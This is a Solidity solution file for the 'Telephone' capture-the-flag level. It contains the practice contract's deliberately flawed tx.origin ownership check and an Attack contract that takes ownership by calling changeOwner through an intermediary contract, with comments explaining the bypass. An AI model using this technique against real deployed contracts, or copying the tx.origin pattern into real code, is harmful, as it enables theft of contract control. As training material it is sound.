// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



//////// @title Solution Telephone
/// @author  Yash Patel


// Q.] WE have to claim ownership
// => The Telephone contract has a function change owner as of now the deployer is the owner and we have to call that function to get the ownership
// => Here the critical part is we cannot directly call this function because tx.origin != msg.sender and if we call the function directly then this will not meet the criteria
// => Because then tx.origin will always equal to msg.sender and as the tx.origin will be the one who initiates the transaction and msg.sender will also be the same address 
// => So We need a mediator contract where we can call the function so tx.origin will be us but the msg.sender will be the mediator contract and it will clears the criteria and 
// => WE are now the owner of the Telephone contract
contract Attack {

constructor(address _telephone) {
// Here the msg.sender will be the wallet address from which we are calling 
    Telephone(_telephone).changeOwner(msg.sender);
}
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
// Here tx.origin will be wallet address which is initiating the transaction and msg.sender will be the contract address 
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}